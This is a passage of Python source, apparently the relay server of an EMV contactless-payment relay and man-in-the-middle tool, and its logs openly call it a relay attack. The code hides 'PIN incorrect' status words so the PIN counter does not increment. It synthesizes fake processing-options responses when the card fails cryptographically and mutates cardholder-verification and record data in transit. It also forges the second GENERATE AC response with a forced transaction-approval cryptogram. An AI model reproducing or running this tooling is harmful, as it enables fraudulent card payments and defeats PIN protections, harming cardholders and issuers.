        # When PIN bypass is enabled, also mask SW 63 (PIN incorrect) to prevent counter increment
        if self.state.verify_bypass_enabled and sw == bytes.fromhex("63"):
            log.warning(
                f"[PIN-PROTECT] Masking SW 63 (PIN incorrect) because "
                f"VERIFY_BYPASS is enabled. Preventing PIN counter increment. "
                f"Phase: {self.guard.phase.name}"
            )
            payload = constants.SW_9000
            sw = constants.SW_9000

        # Optional test fail-open for physical cards that return GPO 6984:
        # synthesize a minimal valid GPO template (77/AIP+AFL) so terminal flow can continue.
        crypto_failure_detected = False

        if (
                pending_ins_for_guard == constants.INS_GET_PROCESSING_OPTIONS
                and sw in (
                bytes.fromhex("6984"),
                bytes.fromhex("6985"),
                bytes.fromhex("6F00"),
        )
        ):
            crypto_failure_detected = True
            self._card_crypto_failure_count += 1
            self._card_last_failure_phase = self.guard.phase.name
            old_sw = sw.hex().upper() if len(sw) == 2 else "??"
            severity = (
                "CRITICAL"
                if self._card_crypto_failure_count >= 3
                else "WARNING"
            )

            log.error(
                f"[CARD-STATE-{severity}] Cryptographic failure "
                f"#{self._card_crypto_failure_count}: SW {old_sw} on GPO. "
                f"Card may be in broken state after relay attack. "
                f"Phase: {self.guard.phase.name}. "
                f"RECOMMENDATION: If failures persist, perform card cold-reset "
                f"(power cycle) or SELECT deselect/reselect AID."
            )

            if self.gpo_force_success_enabled:
                payload = (
                        bytes.fromhex("770E8202200094080801010010010200")
                        + constants.SW_9000
                )
                sw = constants.SW_9000
                log.warning(
                    f"[GPO-FAILOPEN] Synthesized GPO 77 template due to SW {old_sw}; "
                    "reader GPO failure bypassed for test flow continuity"
                )

        # 2. Record status word and advance guard.
        phase_before = self.guard.phase
        self.guard.record_sw(sw)
        phase_advanced = False
        transition_reason = ""

        if pending and len(pending) > 1:
            ins = pending[constants.APDU_INS]

            if ins == constants.INS_SELECT:
                aid = constants.extract_aid_from_select(pending)

                if aid and constants.is_ppse_or_pse(aid):
                    if (
                            sw == constants.SW_9000
                            and phase_before not in (Phase.IDLE, Phase.PPSE_SELECTED)
                    ):
                        self._restart_emv_flow(
                            f"fresh PPSE SELECT during {phase_before.name}"
                        )
                        # We just reset guard/state; keep current successful RAPDU SW
                        # so PPSE phase can advance on this same frame.
                        self.guard.record_sw(sw)

                    ok, reason = self.guard.advance(Phase.PPSE_SELECTED)
                    phase_advanced = ok

                    if ok:
                        transition_reason = reason
                        self._guard_log(reason)
                    else:
                        self._guard_log(
                            f"PPSE advance skipped: {reason}",
                            blocked=True,
                        )

                elif aid:
                    ok, reason = self.guard.advance(Phase.AID_SELECTED)
                    phase_advanced = ok

                    if ok:
                        transition_reason = reason
                        brand = constants.identify_brand_from_aid(aid)

                        with self.lock:
                            self.state.selected_aid = aid
                            self.state.brand = brand

                            # Look up actual issuer profile if possible, otherwise use dynamic placeholder
                            # Since we don't have country code yet, we use a generic lookup or the last known one
                            # This will be refined as more tags (like 5F28) are read.
                            if self.guard.issuer_profile is None:
                                import issuer_profiles
                                self.guard.issuer_profile = issuer_profiles.get_issuer_profile("")
                                self.guard.issuer_profile.brand = brand
                            else:
                                self.guard.issuer_profile.brand = brand

                        log.info(
                            f"AID selected: {aid.hex().upper()} -> brand={brand}"
                        )
                        self._guard_log(reason)

                    else:
                        self._guard_log(
                            f"AID advance skipped: {reason}",
                            blocked=True,
                        )

            elif ins == constants.INS_GET_PROCESSING_OPTIONS:
                ok, reason = self.guard.advance(Phase.GPO_RESPONDED)
                phase_advanced = ok

                if ok:
                    transition_reason = reason
                    self._guard_log(reason)
                else:
                    self._guard_log(
                        f"GPO advance skipped: {reason}",
                        blocked=True,
                    )

            elif ins == constants.INS_READ_RECORD:
                ok, reason = self.guard.advance(Phase.READ_RECORD_DONE)
                phase_advanced = ok

                if ok:
                    transition_reason = reason
                    self._guard_log(reason)

                    # --- CVM INTEGRATION: Extract CDOL1, CVM List, AUC from READ RECORD ---
                    try:
                        if len(payload) < 2 or payload[-2:] != constants.SW_9000:
                            log.debug(
                                "[CVM] READ RECORD non-9000, skipping CVM extraction"
                            )
                            cdol1_raw, cvm_raw, auc_raw = b"", b"", b""
                        else:
                            cdol1_raw, cvm_raw, auc_raw = extract_card_cvm_data(payload)

                        if cdol1_raw:
                            with self.lock:
                                self.state.cdol1_entries = parse_cdol1(cdol1_raw)
                                log.info(
                                    f"[CVM] CDOL1 parsed: "
                                    f"{len(self.state.cdol1_entries)} entries "
                                    f"from {cdol1_raw.hex().upper()}"
                                )

                        if cvm_raw:
                            with self.lock:
                                self.state.cvm_entries = parse_cvm_list(cvm_raw)
                                cvm_str = ",".join(
                                    f"{m:02X}{c:02X}"
                                    for m, c in self.state.cvm_entries
                                )
                                log.info(
                                    f"[CVM] CVM List parsed: [{cvm_str}] "
                                    f"from {cvm_raw.hex().upper()}"
                                )

                        if auc_raw:
                            with self.lock:
                                self.state.auc = auc_raw
                                log.info(
                                    f"[CVM] AUC = {auc_raw.hex().upper()}"
                                )

                    except Exception as e:
                        log.error(f"[CVM] Extraction failed: {e}")

                else:
                    self._guard_log(
                        f"READ_RECORD advance skipped: {reason}",
                        blocked=True,
                    )

            elif ins == constants.INS_GENERATE_AC:
                if phase_before == Phase.READ_RECORD_DONE:
                    ok, reason = self.guard.advance(Phase.FIRST_GAC_SENT)
                    phase_advanced = ok

                    if ok:
                        transition_reason = reason
                        self._guard_log(reason)
                    else:
                        self._guard_log(
                            f"first GAC advance skipped: {reason}",
                            blocked=True,
                        )

                elif phase_before in (
                        Phase.ARQC_RECEIVED,
                        Phase.EXTERNAL_AUTH_DONE,
                ):
                    ok, reason = self.guard.advance(Phase.COMPLETE)
                    phase_advanced = ok

                    if ok:
                        transition_reason = reason
                        self._guard_log(reason)
                    else:
                        self._guard_log(
                            f"second GAC advance skipped: {reason}",
                            blocked=True,
                        )

            elif ins == constants.INS_EXTERNAL_AUTHENTICATE:
                ok, reason = self.guard.advance(Phase.EXTERNAL_AUTH_DONE)
                phase_advanced = ok

                if ok:
                    transition_reason = reason
                    self._guard_log(reason)
                else:
                    self._guard_log(
                        f"EXTERNAL AUTH advance skipped: {reason}",
                        blocked=True,
                    )

        # ------------------------------------------------------------------
        # COGNITION HOOK #1:
        # Publish any Guard transition completed by the primary RAPDU handler.
        # ------------------------------------------------------------------
        cognition_phase_checkpoint = self.guard.phase

        if (
                phase_advanced
                and phase_before.name != cognition_phase_checkpoint.name
        ):
            sink = getattr(self, "_cognition_event_sink", None)
            if sink is not None:
                try:
                    sink(
                        "GUARD_TRANSITION",
                        source="relserv",
                        exchange_id=exchange_id,
                        payload={
                            "from": phase_before.name,
                            "to": cognition_phase_checkpoint.name,
                            "reason": transition_reason,
                        },
                    )
                except Exception:
                    log.debug(
                        "cognition Guard event sink failed",
                        exc_info=True,
                    )

        # 3. Observe the reader RAPDU for GPO/READ RECORD/GAC if the phase advanced.
        observation_phase_before = self.guard.phase

        if pending and len(pending) > constants.APDU_INS:
            pending_ins = pending[constants.APDU_INS]

            if (
                    pending_ins == constants.INS_GET_PROCESSING_OPTIONS
                    and phase_advanced
            ):
                self._observe_reader_rapdu(payload)

            elif (
                    pending_ins == constants.INS_GENERATE_AC
                    and phase_before == Phase.READ_RECORD_DONE
                    and phase_advanced
            ):
                self._observe_reader_rapdu(payload)

        # ------------------------------------------------------------------
        # COGNITION HOOK #2:
        # _observe_reader_rapdu() can itself advance the Guard
        # FIRST_GAC_SENT -> ARQC_RECEIVED. Capture that here.
        # ------------------------------------------------------------------
        observation_phase_after = self.guard.phase

        if observation_phase_before.name != observation_phase_after.name:
            sink = getattr(self, "_cognition_event_sink", None)
            if sink is not None:
                try:
                    sink(
                        "GUARD_TRANSITION",
                        source="relserv",
                        exchange_id=exchange_id,
                        payload={
                            "from": observation_phase_before.name,
                            "to": observation_phase_after.name,
                            "reason": "reader RAPDU observation advanced Guard",
                        },
                    )
                except Exception:
                    log.debug(
                        "cognition Guard observation sink failed",
                        exc_info=True,
                    )

        # 4. Packet-router mutation
        if self._router_mutation_active():
            pending_ins = (
                pending[constants.APDU_INS]
                if pending and len(pending) > constants.APDU_INS
                else None
            )

            if (
                    self.state.tvr_mutation_enabled
                    and pending_ins in (
                    constants.INS_GET_PROCESSING_OPTIONS,
                    constants.INS_READ_RECORD,
            )
            ):
                allowed, reason = (
                    False,
                    "GPO/READ RECORD RAPDU owned by built-in CVM mutator",
                )
            else:
                allowed, reason = self._guard_router_mutation(
                    "rapdu",
                    pending_ins,
                )

            if (
                    pending_ins in (
                    constants.INS_GET_PROCESSING_OPTIONS,
                    constants.INS_READ_RECORD,
            )
                    and not phase_advanced
            ):
                allowed = False
                reason = "response did not complete a legal successful phase transition"

            if not allowed:
                log.warning(
                    f"[GUARD] packet-router RAPDU mutation blocked: {reason}"
                )
            else:
                try:
                    self._packet_router.set_last_capdu_to_emulator(
                        self.state.pending_capdu
                    )
                    payload = self._packet_router.apply_mitm(
                        "rapdu",
                        payload,
                        self._packet_router.session,
                        log,
                    )
                except Exception as e:
                    log.error(
                        f"packet_router.apply_mitm failed: {e}"
                    )

        # 5. CVM mutation (GPO / READ RECORD)
        if self.state.tvr_mutation_enabled:
            policy = self._mutation_policy()

            pending_ins = (
                pending[constants.APDU_INS]
                if pending and len(pending) > constants.APDU_INS
                else None
            )

            if pending_ins == constants.INS_GET_PROCESSING_OPTIONS:
                allowed, reason = self.guard.check_mutation(
                    constants.INS_GET_PROCESSING_OPTIONS,
                    self.state,
                )

                if not phase_advanced:
                    allowed = False
                    reason = (
                        "GPO response did not complete a legal successful "
                        "phase transition"
                    )

                if not allowed:
                    self._guard_log(
                        f"GPO mutation blocked: {reason}",
                        blocked=True,
                    )
                else:
                    try:
                        original_payload = payload
                        result = mutate_gpo_response(
                            payload,
                            self.state.cdcvm_verified,
                            policy=policy,
                        )

                        if isinstance(result, tuple):
                            payload, _ok = result
                            if payload != original_payload:
                                log.debug("[GPO-MUTATE] applied")
                        else:
                            payload = result

                    except Exception as e:
                        log.error(
                            f"[AIP-MUTATE CRASH] {type(e).__name__}: {e}",
                            exc_info=True,
                        )

            elif pending_ins == constants.INS_READ_RECORD:
                allowed, reason = self.guard.check_mutation(
                    constants.INS_READ_RECORD,
                    self.state,
                )

                if not phase_advanced:
                    allowed = False
                    reason = (
                        "READ RECORD response did not complete a legal "
                        "successful phase transition"
                    )

                if not allowed:
                    self._guard_log(
                        f"READ RECORD mutation blocked: {reason}",
                        blocked=True,
                    )
                else:
                    try:
                        original_payload = payload
                        result = mutate_read_record_response(
                            payload,
                            policy=policy,
                        )

                        if isinstance(result, tuple):
                            payload, _ok = result
                            if payload != original_payload:
                                log.debug(
                                    "[READ-RECORD-MUTATE] applied"
                                )
                        else:
                            payload = result

                    except Exception as e:
                        log.error(
                            f"[CVM-MUTATE CRASH] {type(e).__name__}: {e}"
                        )

        self._extract_runtime_card_context(payload)

        # 6. Store the finished exchange for duplicate replay.
        response_id = (
            exchange_id
            if exchange_id is not None
            else expected_id
        )

        if response_id is not None and pending is not None:
            self._last_exchange = (
                self.active_epoch,
                response_id,
                pending,
                payload,
            )

        # 7. Forward the RAPDU to the target.
        self._send_frame(
            target,
            constants.SID_RAPDU,
            constants.build_exchange_payload(
                response_id,
                payload,
            ),
        )

        if response_id is not None:
            self._send_ack(
                addr,
                f"RAPDU {response_id}",
            )

        sw_hex = (
            f"{payload[-2]:02X}{payload[-1]:02X}"
            if len(payload) >= 2
            else "??"
        )

        pending_ins = (
            self.state.pending_capdu[constants.APDU_INS]
            if (
                    self.state.pending_capdu
                    and len(self.state.pending_capdu) > constants.APDU_INS
            )
            else None
        )

        from constants import INS_MAP

        pending_ins_name = (
            INS_MAP.get(pending_ins, "?")
            if pending_ins is not None
            else "?"
        )

        _record_apdu(
            f"{source_name[:3]}>{target_name[:3]}",
            "RAPDU",
            pending_ins_name,
            payload,
            note=f"SW={sw_hex}",
        )

        # ------------------------------------------------------------------
        # COGNITION APDU HOOK:
        # At this point CAPDU + final RAPDU + exchange ID + resulting Guard
        # phase are all available, and pending state has not yet been cleared.
        # ------------------------------------------------------------------
        sink = getattr(self, "_cognition_apdu_sink", None)
        if sink is not None and pending is not None:
            try:
                sink(
                    direction=f"{source_name[:3]}>{target_name[:3]}",
                    apdu_hex=pending.hex().upper(),
                    response_hex=payload.hex().upper(),
                    phase_after=self.guard.phase.name,
                    exchange_id=response_id,
                )
            except Exception:
                log.debug(
                    "cognition APDU event sink failed",
                    exc_info=True,
                )

        log.info(
            f"RAPDU sw={sw_hex} "
            f"{source_name} > {target_name} "
            f"[guard={self.guard.phase.name}]"
        )

        if self.full_output_enabled:
            seq = response_id if response_id is not None else -1
            log.info(
                f"RAPDU_TRACE seq={seq} len={len(payload)} "
                f"sw={sw_hex} src={source_name} dst={target_name} "
                f"data={payload.hex().upper()}"
            )

        with self.lock:
            self.state.pending_capdu = None
            self.state.pending_exchange_id = None
            self._reset_pending_state()
    # ------------------------------------------------------------------
    # 5.23  Helper - observe reader RAPDU (GPO & GAC)
    # ------------------------------------------------------------------
    def _observe_reader_rapdu(self, payload: bytes) -> None:
        pending = self.state.pending_capdu
        if not pending or len(pending) < 2:
            return
        ins = pending[constants.APDU_INS]
        if ins == constants.INS_GET_PROCESSING_OPTIONS:
            template = constants.detect_gpo_template(payload)
            with self.lock:
                self.state.gpo_template = template
            if template is not None:
                log.info(f"GPO template cached: 0x{template:02X}")
            else:
                log.warning("GPO response used unknown template - 2nd GAC forge may fail")
            return
        if ins == constants.INS_GENERATE_AC:
            cache = extract_arqc_from_rapdu(payload, self.state.gpo_template)
            if cache.template is None:
                cache.template = self.state.gpo_template
            is_arqc, reason = cid_indicates_arqc(cache, payload)
            for note in cache.parse_notes:
                log.debug(f"[GAC-PARSE] {note}")
            arqc_phase_accepted = False
            armed = False
            if is_arqc:
                ok, guard_reason = self.guard.advance(Phase.ARQC_RECEIVED)
                if ok:
                    arqc_phase_accepted = True
                    armed = cache.is_complete()
                    if not armed:
                        reason = f"{reason}; ARQC cache incomplete"
                    self._guard_log(guard_reason)
                else:
                    self._guard_log(f"ARQC phase advance failed: {guard_reason}", blocked=True)
                    reason = f"{reason}; guard rejected: {guard_reason}"
            with self.lock:
                self.state.arqc_cache = cache
                # Sync cache to guard for its internal handlers
                self.guard.arqc_cache = cache
                self.state.second_ae_pending = armed
                self.state.second_ae_reason = reason
                self.state.gac_response_count += 1
            if arqc_phase_accepted:
                tmpl_str = f"0x{cache.template:02X}" if cache.template else "None"
                atc_str = cache.atc.hex().upper() if cache.atc else "??"
                ac_str = cache.ac.hex().upper() if cache.ac else "??"
                log.info(
                    f"[ARQC-CACHED] template={tmpl_str} brand={self.state.brand} "
                    f"ATC={atc_str} AC={ac_str} reason='{reason}' "
                    f"-> 2nd GAC forge {'ARMED' if armed else 'NOT ARMED'} "
                    f"[guard={self.guard.phase.name}]"
                )
            elif not is_arqc:
                log.warning(
                    f"[NO-ARQC] 2nd GAC forge NOT armed. Reason: {reason}. "
                    f"Parse notes: {'; '.join(cache.parse_notes)}"
                )
                ok, guard_reason = self.guard.advance(Phase.COMPLETE)
            if ok:
                self._guard_log(guard_reason)
            else:
                self._guard_log(f"terminal GAC advance failed: {guard_reason}", blocked=True)

    # ------------------------------------------------------------------
    # 5.24  Second GAC forge
    # ------------------------------------------------------------------
    def _handle_second_gac_forge(self, capdu: bytes) -> None:
        cache = self.state.arqc_cache
        p1 = constants.gac_p1(capdu)
        brand = self.state.brand
        forced_cid = 0x40  # CID_TC
        forged = forge_2nd_gac(cache, forced_cid=forced_cid, brand=brand)
        if forged is None:
            log.error(
                f"[ARPC-FORGE] Unknown template (cached={cache.template}); "
                f"cannot forge 2nd GAC. Failing closed with 6F00."
            )
            pending_id = self.state.pending_exchange_id
            source_capdu = self._pending_source_capdu or capdu
            if pending_id is not None:
                self._last_exchange = (
                    self.active_epoch,
                    pending_id,
                    source_capdu,
                    constants.SW_6F00,
                )
            self._send_frame(
                self.emulator_addr,
                constants.SID_RAPDU,
                constants.build_exchange_payload(self.state.pending_exchange_id, constants.SW_6F00),
            )
            with self.lock:
                self.state.second_ae_pending = False
                self.state.second_ae_reason = "forge failed: unknown template"
                self.state.pending_capdu = None
                self.state.pending_exchange_id = None
                self._reset_pending_state()
            return
        self.guard.record_sw(constants.SW_9000)
        ok, guard_reason = self.guard.advance(Phase.SECOND_GAC_FORGED)
        if not ok:
            log.error(f"[GUARD] Forge execution blocked: {guard_reason}")
            pending_id = self.state.pending_exchange_id
            source_capdu = self._pending_source_capdu or capdu
            if pending_id is not None:
                self._last_exchange = (
                    self.active_epoch,
                    pending_id,
                    source_capdu,
                    constants.SW_6F00,
                )
            self._send_frame(
                self.emulator_addr,
                constants.SID_RAPDU,
                constants.build_exchange_payload(self.state.pending_exchange_id, constants.SW_6F00),
            )
            with self.lock:
                self.state.second_ae_pending = False
                self.state.second_ae_reason = f"forge blocked: {guard_reason}"
                self.state.pending_capdu = None
                self.state.pending_exchange_id = None
                self._reset_pending_state()
            return
        with self.lock:
            self.state.arpc_forge_count += 1
            self.state.second_ae_pending = False
            self.state.second_ae_reason = f"forged and consumed (#{self.state.arpc_forge_count})"
            count = self.state.arpc_forge_count
        self._guard_log(guard_reason)
        atc_str = cache.atc.hex().upper() if cache.atc else "default"
        iad_source = "cached" if cache.iad else f"brand-default:{brand}"
        log.info(
            f"[ARPC-FORGE #{count}] 2nd GAC forged "
            f"(template=0x{cache.template:02X}, brand={brand}, "
            f"CID=0x{forced_cid:02X}, ATC={atc_str}, IAD={iad_source}, "
            f"P1_req={constants.gac_p1_name(p1)}) -> EMULATOR "
            f"[guard={self.guard.phase.name}]"
        )
        _record_apdu("FORGE>EMU", "RAPDU", "GENERATE AC (2nd) FORGED",
                     forged,
                     note=f"template=0x{cache.template:02X} brand={brand} CID=0x{forced_cid:02X}")
        pending_id = self.state.pending_exchange_id
        source_capdu = self._pending_source_capdu or capdu
        if pending_id is not None:
            self._last_exchange = (
                self.active_epoch,
                pending_id,
                source_capdu,
                forged,
            )
        _ = self._send_frame(
            self.emulator_addr,
            constants.SID_RAPDU,
            constants.build_exchange_payload(self.state.pending_exchange_id, forged),
        )
        with self.lock:
            self.state.pending_capdu = None
            self.state.pending_exchange_id = None
            self._reset_pending_state()

    # ------------------------------------------------------------------
    # 5.25  Heartbeat handling
    # ------------------------------------------------------------------
    def _handle_heartbeat(self, payload: bytes, addr: Tuple[str, int]) -> None:
        if addr not in (self.reader_addr, self.emulator_addr):
            log.warning(f"HEARTBEAT from unregistered address {addr}")
            return
        self._send_ack(addr, "HEARTBEAT")

    def _new_epoch(self, previous_epoch: int) -> int:
        while True:
            epoch = secrets.randbits(32)
            if epoch != 0 and epoch != previous_epoch:
                return epoch

    # ------------------------------------------------------------------
    # 5.26  Session begin rate-limit
    # ------------------------------------------------------------------
    def _session_begin_rate_ok(self, addr: Tuple[str, int]) -> bool:
        """Per-endpoint token bucket that bounds work before frame parsing."""
        if self.SESSION_BEGIN_RATE_LIMIT <= 0:
            return True
        now = time.time()
        # Clean stale entries
        for stale_key, timestamps in list(self._session_begin_timestamps.items()):
            while timestamps and now - timestamps[0] >= self.SESSION_BEGIN_RATE_LIMIT:
                timestamps.popleft()
            if not timestamps:
                del self._session_begin_timestamps[stale_key]
        timestamps = self._session_begin_timestamps.setdefault(addr, deque())
        if len(timestamps) >= self.SESSION_BEGIN_BURST:
            return False
        timestamps.append(now)
        return True

    # ------------------------------------------------------------------
    # 5.27  UDP rate-limit helper
    # ------------------------------------------------------------------
    def _udp_rate_ok(self, addr: Tuple[str, int]) -> bool:
        """Return True if the packet from *addr* is within the UDP rate limit."""
        if not hasattr(self, '_udp_rate_state'):
            self._udp_rate_state: Dict[Tuple[str, int], Tuple[float, float]] = {}
        now = time.time()
        if constants.PEER_TIMEOUT_SECONDS > 0:
            stale = [
                peer for peer, (_, last) in self._udp_rate_state.items()
                if now - last > constants.PEER_TIMEOUT_SECONDS
            ]
            for peer in stale:
                del self._udp_rate_state[peer]
        # Enforce global peer limit
        if len(self._udp_rate_state) >= constants.UDP_RATE_MAX_PEERS and addr not in self._udp_rate_state:
            return False
        tokens, last = self._udp_rate_state.get(addr, (constants.UDP_RATE_BURST, now))
        elapsed = now - last
        new_tokens = min(constants.UDP_RATE_BURST, tokens + elapsed * constants.UDP_RATE_PER_SECOND)
        if new_tokens < 1:
            self._udp_rate_state[addr] = (new_tokens, now)
            return False
        new_tokens -= 1
        self._udp_rate_state[addr] = (new_tokens, now)
        return True

    # ------------------------------------------------------------------
    # 5.28  Control handling
    # ------------------------------------------------------------------
    def _handle_ctrl(self, payload: bytes, addr: Tuple[str, int]) -> None:
        body, auth_ok = self._ctrl_verify_hmac(payload, self._incoming_epoch, 0)
        if not auth_ok:
            log.warning(f"CTRL from {addr}: HMAC verification FAILED - dropped")
            return
        command = body.decode("utf-8", errors="replace").strip().upper()
        log.info(f"CTRL from {addr}: {command}")

        # DEREGISTER via CTRL
        if command in ("DEREGISTER", "OP_DISCONNECT", "DISCONNECT"):
            peer_removed = False
            removed_roles = []
            notify_target = None
            notify_role = None
            if addr == self.reader_addr:
                self.reader_addr = None
                self.reader_id = None
                peer_removed = True
                removed_roles.append("READER")
                notify_target = self.emulator_addr
                notify_role = "READER"
            if addr == self.emulator_addr:
                self.emulator_addr = None
                self.emulator_id = None
                peer_removed = True
                removed_roles.append("EMULATOR")
                notify_target = self.reader_addr
                notify_role = "EMULATOR"
            self._peer_versions.pop(addr, None)
            self._send_ack(addr, "DEREGISTER")
            self._send_ctrl_response(addr, "OK DEREGISTER")
            if peer_removed:
                has_remaining_peer = (self.reader_addr is not None or self.emulator_addr is not None)
                self._reset_session(f"{'+'.join(removed_roles)} disconnected", unlock_epoch=(not has_remaining_peer))
                log.info(f"DEVICE DISCONNECTED role={'+'.join(removed_roles)} "
                         f"address={addr[0]}:{addr[1]} reason=deregistered")
                self._log_connected_devices("peer deregistered")
                if notify_target and notify_role:
                    self._send_ctrl_response(notify_target, f"PEER_DISCONNECTED {notify_role}")
            return

        is_card_present_cmd = _starts_with_any(command, CARD_PRESENT_PREFIXES)
        is_card_removed_cmd = _starts_with_any(command, CARD_REMOVED_PREFIXES)
        is_mgmt = _starts_with_any(command, MGMT_PREFIXES)

        if addr not in (self.reader_addr, self.emulator_addr):
            if is_card_present_cmd and self.reader_addr is None and addr != self.emulator_addr:
                pass
            elif is_card_present_cmd or is_card_removed_cmd or not is_mgmt:
                log.warning(f"CTRL from unregistered address {addr} rejected")
                self._send_ctrl_response(addr, "ERR NOT_REGISTERED")
                return

        if (
            command and not command.startswith("SESSION_BEGIN")
            and not is_mgmt
            and self.active_epoch != 0
            and self._incoming_epoch not in (0, self.active_epoch)
        ):
            log.warning(
                f"CTRL stale epoch from {addr}: got={self._incoming_epoch} active={self.active_epoch}"
            )
            self._send_ctrl_response(addr, f"ERR STALE_EPOCH ACTIVE={self.active_epoch}")
            return
        # -----------------------------------------------------------------
        # SESSION_BEGIN
        # -----------------------------------------------------------------
        if command.startswith("SESSION_BEGIN"):
            if (not self.allow_single_peer_session) and (self.reader_addr is None or self.emulator_addr is None):
                self._metric_inc("session_begin_peer_not_ready_total")
                self._send_ctrl_response(addr, "ERR PEERS_NOT_READY")
                return
            parts = command.split(None, 1)
            token = parts[1] if len(parts) == 2 else "LEGACY"
            now = time.time()
            for stale_key, (_, seen_ts) in list(self._session_token_seen.items()):
                if now - seen_ts >= self.SESSION_TOKEN_TTL_SECONDS:
                    del self._session_token_seen[stale_key]
            for stale_token, (_, _, seen_ts) in list(self._session_token_global_seen.items()):
                if now - seen_ts >= self.SESSION_TOKEN_TTL_SECONDS:
                    del self._session_token_global_seen[stale_token]
            with self.lock:
                pending_id = self.state.pending_exchange_id
                pending_capdu = self.state.pending_capdu
            if pending_id is not None or pending_capdu is not None:
                log.warning(
                    f"SESSION_BEGIN rejected during in-flight exchange "
                    f"from {addr}: exchange={pending_id}"
                )
                self._send_ctrl_response(
                    addr, f"ERR EXCHANGE_IN_FLIGHT ID={pending_id if pending_id is not None else 'LEGACY'}"
                )
                return
            if not self._session_begin_rate_ok(addr):
                log.warning(f"SESSION_BEGIN rate-limited from {addr}")
                self._send_ctrl_response(addr, "ERR RATE_LIMITED")
                return
            request_key = (addr, token)
            previous_seen = self._session_token_seen.get(request_key)
            if previous_seen is not None:
                seen_epoch, _ = previous_seen
                if seen_epoch != self.active_epoch:
                    log.warning(f"SESSION_BEGIN replay rejected from {addr}: token={token}")
                    self._send_ctrl_response(addr, "ERR TOKEN_REPLAY")
                    return
            global_seen = self._session_token_global_seen.get(token)
            if global_seen is not None:
                seen_epoch, seen_addr, _ = global_seen
                if seen_epoch != self.active_epoch and seen_addr != addr:
                    log.warning(
                        f"SESSION_BEGIN cross-peer replay rejected from {addr}: token={token} "
                        f"previous_peer={seen_addr} previous_epoch={seen_epoch}"
                    )
                    self._send_ctrl_response(addr, "ERR TOKEN_REPLAY")
                    return
            epoch = self._session_requests.get(request_key)
            if self.active_epoch != 0:
                # Epoch lock: once active, all SESSION_BEGIN calls from either peer reuse it
                # until explicit SESSION_RESET/CARD_REMOVED/OP_DISCONNECT path.
                epoch = self.active_epoch
                self._session_requests[request_key] = epoch
                if len(self._session_requests) > 128:
                    self._session_requests = {request_key: epoch}
                self._session_token_seen[request_key] = (epoch, now)
                self._session_token_global_seen[token] = (epoch, addr, now)
                log.info(f"Session epoch reused: {epoch}")
            elif epoch is None:
                with self.lock:
                    previous_epoch = self.active_epoch
                    new_epoch = self._new_epoch(previous_epoch)
                    self.active_epoch = new_epoch
                    self.state.reset()
                    self.guard.reset()
                    self._reset_pending_state()
                    if self._packet_router:
                        try:
                            self._packet_router.reset_session()
                        except Exception as e:
                            log.warning(f"Packet router disabled after session reset failure: {e}")
                    epoch = self.active_epoch
                    self._session_requests[request_key] = epoch
                    if len(self._session_requests) > 128:
                        self._session_requests = {request_key: epoch}
                    self._session_token_seen[request_key] = (epoch, now)
                    self._session_token_global_seen[token] = (epoch, addr, now)
                log.info(f"Session epoch opened: {epoch} [guard={self.guard.phase.name}]")
            else:
                if epoch != self.active_epoch:
                    self._send_ctrl_response(addr, "ERR SESSION_SUPERSEDED")
                    return
                self._session_token_seen[request_key] = (epoch, now)
                self._session_token_global_seen[token] = (epoch, addr, now)
                log.info(f"Session epoch retry acknowledged: {epoch}")
            self._send_ctrl_response(addr, f"SESSION_ACK {epoch} {token}")
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_ctrl_response(target, f"SESSION_BEGIN {epoch}")
            return
        # -----------------------------------------------------------------
        # CDCVM_VERIFIED
        # -----------------------------------------------------------------
        if command.startswith("CDCVM_VERIFIED "):
            if addr != self.emulator_addr:
                log.warning(f"CDCVM evidence rejected from non-emulator {addr}")
                self._send_ctrl_response(addr, "ERR CDCVM_EVIDENCE_SOURCE")
                return
            method = command.split(None, 1)[1].strip()
            if method not in ("BIOMETRIC", "DEVICE_CREDENTIAL", "TEST_HARNESS"):
                self._send_ctrl_response(addr, "ERR CDCVM_EVIDENCE_METHOD")
                return
            with self.lock:
                self.state.cdcvm_verified = True
                self.state.cdcvm_evidence = method
            log.info(f"CDCVM evidence accepted: method={method} source={addr}")
            self._send_ctrl_response(addr, f"OK CDCVM_VERIFIED {method}")
            return
        # -----------------------------------------------------------------
        # CARD_PRESENT / CARD_REMOVED
        # -----------------------------------------------------------------
        if is_card_present_cmd:
            if addr == self.emulator_addr or (self.reader_addr is not None and addr != self.reader_addr):
                self._metric_inc("card_events_rejected_source_total")
                self._send_ctrl_response(addr, "ERR CARD_EVENT_READER_ONLY")
                return
            now = time.time()
            reader_present = getattr(self.state, "reader_card_present", True)
            already_present = bool(self.state.card_present and reader_present)
            if already_present and self._last_card_event_kind == "CARD_PRESENT":
                if (now - self._last_card_event_ts) <= self.card_event_debounce_seconds:
                    self._metric_inc("card_events_debounced_total")
                self._send_ctrl_response(addr, "OK CARD_PRESENT")
                return
            self._reset_session("card present", unlock_epoch=False)
            with self.lock:
                if self.reader_addr is None and addr != self.emulator_addr:
                    self.reader_addr = addr
                    self.reader_last_seen = time.time()
                self.state.card_present = True
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = True
                self._last_card_event_kind = "CARD_PRESENT"
                self._last_card_event_ts = now
            log.info(f"\033[92mCARD PRESENT detected from {addr}\033[0m")
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_frame(target, constants.SID_CTRL, body)
            self._send_ctrl_response(addr, "OK CARD_PRESENT")
            return
        if is_card_removed_cmd:
            if self.reader_addr is None or addr != self.reader_addr:
                self._metric_inc("card_events_rejected_source_total")
                self._send_ctrl_response(addr, "ERR CARD_EVENT_READER_ONLY")
                return
            now = time.time()
            reader_present = getattr(self.state, "reader_card_present", False)
            already_removed = not bool(self.state.card_present or reader_present)
            if already_removed and self._last_card_event_kind == "CARD_REMOVED":
                if (now - self._last_card_event_ts) <= self.card_event_debounce_seconds:
                    self._metric_inc("card_events_debounced_total")
                self._send_ctrl_response(addr, "OK CARD_REMOVED")
                return
            self._reset_session("card removed", unlock_epoch=False)
            with self.lock:
                self.state.card_present = False
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = False
                self._last_card_event_kind = "CARD_REMOVED"
                self._last_card_event_ts = now
            log.info(f"\033[92mCARD REMOVED detected from {addr}\033[0m")
            target = self.emulator_addr if addr == self.reader_addr or (self.reader_addr is None and addr != self.emulator_addr) else self.reader_addr
            if target:
                self._send_frame(target, constants.SID_CTRL, body)
            self._send_ctrl_response(addr, "OK CARD_REMOVED")
            return
        # -----------------------------------------------------------------
        # SESSION_RESET
        # -----------------------------------------------------------------
        if command == "SESSION_RESET":
